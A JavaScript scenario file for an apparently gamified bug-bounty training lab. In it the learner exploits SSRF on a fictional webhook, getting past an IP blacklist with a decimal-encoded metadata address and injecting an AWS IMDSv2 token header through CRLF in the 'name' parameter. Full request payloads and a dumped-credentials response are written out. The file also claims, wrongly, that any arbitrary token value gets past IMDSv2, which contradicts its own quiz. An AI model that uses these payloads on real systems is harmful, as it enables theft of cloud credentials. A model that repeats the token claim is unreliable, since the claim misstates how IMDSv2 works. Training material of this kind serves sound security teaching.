// ==========================================================
// SCENARIO 005: SSRF IMDSv2 BYPASS WITH CRLF INJECTION
// ==========================================================

window.scenario_005 = {
  steps: [
    {
      name: "Mission Brief",
      workspace: "markdown",
      xpReward: 100,
      description: `
### Target: webhook.acme-corp.com
Acme Corp has deployed a custom webhook notifier that fires notifications to third-party endpoints. You are testing this webhook for Server-Side Request Forgery (SSRF) vulnerabilities.

#### Objective:
- Check if you can access internal services or cloud metadata endpoints.
- Bypass IP address checks.
- Bypass AWS IMDSv2 metadata protection using CRLF (header injection).

Click **Next Step** to launch passive directory scanning.
      `
    },
    {
      name: "Endpoint Mapping",
      workspace: "recon",
      xpReward: 150,
      description: `
### Webhook Crawler
Find the exact URL parameters and endpoints where webhook URLs are submitted.
      `,
      terminalCommands: [
        {
          name: "katana -u https://webhook.acme-corp.com/ -silent",
          correct: true,
          evidence: {
            title: "Webhook Endpoints",
            content: "POST /api/v1/notifications/send\nParameters: url, name"
          },
          output: [
            { text: "[INF] Scraping site routing rules...", type: "info" },
            { text: "https://webhook.acme-corp.com/api/v1/notifications/send", type: "out" },
            { text: "https://webhook.acme-corp.com/api/v1/notifications/status", type: "out" },
            { text: "[INF] Analysis finished. Webhook endpoint resolved.", type: "success" }
          ]
        }
      ],
      thoughts: `
> [!NOTE]
> Webhooks often contain SSRF vulnerabilities because their core function is to fetch remote URLs on behalf of the server.
      `
    },
    {
      name: "IP Filter Bypass",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Auditing SSRF Filters
You try to send a request to the AWS metadata IP:
\`url=http://169.254.169.254/latest/meta-data/\`

But the server returns:
\`Error: Internal IPs are blocked!\`

The server is using a regex blacklist to filter private IP addresses (like localhost and link-local addresses). To bypass this, we can try decimal encoding.
\`169.254.169.254\` converted to decimal is \`2852039166\`.
      `,
      choices: [
        {
          text: "A) Try localhost decimal: http://2130706433",
          correct: false,
          xp: -10,
          timePenalty: 5,
          outcome: "Bypasses the check, but localhost has no cloud metadata services. Connection refused."
        },
        {
          text: "B) Use decimal encoding: http://2852039166/latest/meta-data/",
          correct: true,
          xp: 50,
          outcome: "The IP filter is bypassed! The server attempts to connect, but the connection times out. Why?"
        },
        {
          text: "C) Try IPv6 format: http://[::1]",
          correct: false,
          xp: -10,
          timePenalty: 2,
          outcome: "The regex filter blocks '::1' as it is a known internal local address."
        }
      ]
    },
    {
      name: "CRLF Injection Discovery",
      workspace: "markdown",
      xpReward: 150,
      description: `
### Bypassing IMDSv2 Protection
AWS EC2 instances now use IMDSv2, which blocks simple GET SSRF by requiring a session token header (\`X-aws-ec2-metadata-token\`). Since we can only send GET requests through the webhook, we cannot acquire the token.

However, the webhook has another parameter: \`name=WebhookName\`.
If the backend appends this parameter directly to the outgoing HTTP request headers without removing newline characters, we can perform **CRLF Injection** to append custom headers (like the AWS security token header) into the outgoing socket.
      `,
      choices: [
        {
          text: "A) Try DNS rebinding to acquire the token",
          correct: false,
          xp: -10,
          timePenalty: 15,
          outcome: "DNS Rebinding fails because the application caches resolved IP addresses internally."
        },
        {
          text: "B) Perform CRLF injection in the 'name' parameter",
          correct: true,
          xp: 50,
          outcome: "You decide to inject %0d%0a (CRLF) characters to append the custom AWS security header into the outgoing socket."
        }
      ]
    },
    {
      name: "Burp Header Injection",
      workspace: "burp",
      xpReward: 200,
      description: `
### Injecting CRLF Payloads
 Tamper with the webhook parameters in Burp. Inject a custom header in the \`name\` field by encoding newlines.
      `,
      burpRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=DefaultWebhook",
      burpResponse: "HTTP/1.1 400 Bad Request\nConnection: close\n\nError: Connection to metadata server timed out (Token missing).",
      burpActions: [
        {
          name: "Inject CRLF Header Bypass",
          correct: true,
          modifiedRequest: "POST /api/v1/notifications/send HTTP/1.1\nHost: webhook.acme-corp.com\nContent-Type: application/x-www-form-urlencoded\n\nurl=http://2852039166/latest/meta-data/iam/security-credentials/admin-role&name=Test%0d%0aX-aws-ec2-metadata-token: AWS_SECRET_TOKEN_BYPASS",
          modifiedResponse: "HTTP/1.1 200 OK\nContent-Type: application/json\n\n{\n  \"Code\": \"Success\",\n  \"AccessKeyId\": \"ASIAXYZ12345678\",\n  \"SecretAccessKey\": \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",\n  \"Token\": \"FLAG{aws_imds_metadata_compromised_via_crlf}\"\n}",
          evidence: {
            title: "AWS Credentials Exfiltration",
            content: "AccessKeyId: ASIAXYZ12345678\nSecretAccessKey: wJalrXUtnFEMI...\nToken: FLAG{aws_imds_metadata_compromised_via_crlf}"
          }
        }
      ]
    },
    {
      name: "Exploitation & Capture",
      workspace: "lab",
      xpReward: 300,
      instructions: "Perform the final exfiltration on the webhook endpoint with the CRLF injection payload. Enter the token key returned from the cloud database service below.",
      targetUrl: "https://webhook.acme-corp.com/api/v1/notifications/send",
      correctFlag: "FLAG{aws_imds_metadata_compromised_via_crlf}"
    },
    {
      name: "Report Writing",
      workspace: "report",
      xpReward: 250
    },
    {
      name: "Bounty & Review",
      workspace: "review"
    },
    {
      name: "Lessons Learned",
      workspace: "quiz",
      quizData: [
        {
          question: "What makes IMDSv2 more secure than IMDSv1?",
          options: [
            "It encrypts all data.",
            "It requires session tokens acquired via PUT requests, preventing basic GET-only SSRF from accessing data.",
            "It runs on a different port.",
            "It blocks external domains automatically."
          ],
          answer: 1
        },
        {
          question: "How does CRLF Injection help in SSRF exploitation?",
          options: [
            "It alters the database schema.",
            "It allows attackers to inject custom HTTP headers or split the request to bypass WAFs or security requirements.",
            "It turns GET requests into POST requests automatically.",
            "It exploits local storage caching."
          ],
          answer: 1
        }
      ]
    }
  ],
  realReport: {
    title: "Server-Side Request Forgery (SSRF) bypasses filters and leverages CRLF to dump AWS IMDSv2 Credentials",
    severity: "Critical",
    type: "SSRF",
    desc: "The notification sender endpoint on /api/v1/notifications/send is vulnerable to SSRF. While internal IP filters are present, they are bypassed using decimal IP representation (2852039166). Additionally, the custom 'name' header parameter is vulnerable to CRLF Injection. Attackers can inject a carriage return and line feed, appending the required X-aws-ec2-metadata-token header to exfiltrate AWS instance credentials.",
    steps: "1. Tamper with the notification post request.\n2. Set 'url' to http://2852039166/latest/meta-data/iam/security-credentials/admin-role.\n3. Set 'name' to: Test%0d%0aX-aws-ec2-metadata-token: ANY_TOKEN.\n4. Submit and observe exfiltrated AWS keys in response.",
    impact: "Full compromise of the AWS EC2 container instance role credentials, allowing read/write access to S3 buckets, databases, and deployment keys.",
    feedback: "Exceptional security finding! By combining decimal bypass with CRLF injection, you achieved full credentials exfiltration. We corrected the CRLF injection and restricted metadata access. Bounty awarded.",
    keywords: ["ssrf", "crlf"]
  }
};
